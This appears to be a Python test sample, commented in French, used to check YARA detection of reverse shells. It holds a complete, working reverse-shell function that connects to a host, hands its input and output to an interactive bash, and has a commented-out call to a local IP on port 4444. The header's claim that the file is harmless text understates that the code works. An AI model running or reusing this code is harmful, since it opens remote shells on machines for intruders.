# FICHIER DE TEST - Reverse shell simulé
# Ce fichier est un EXEMPLE pour tester la détection YARA
# Il ne fait rien de dangereux, c'est juste du texte

import socket
import subprocess
import os

def connect_back(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.Popen(["/bin/bash", "-i"])

# connect_back("192.168.1.100", 4444)
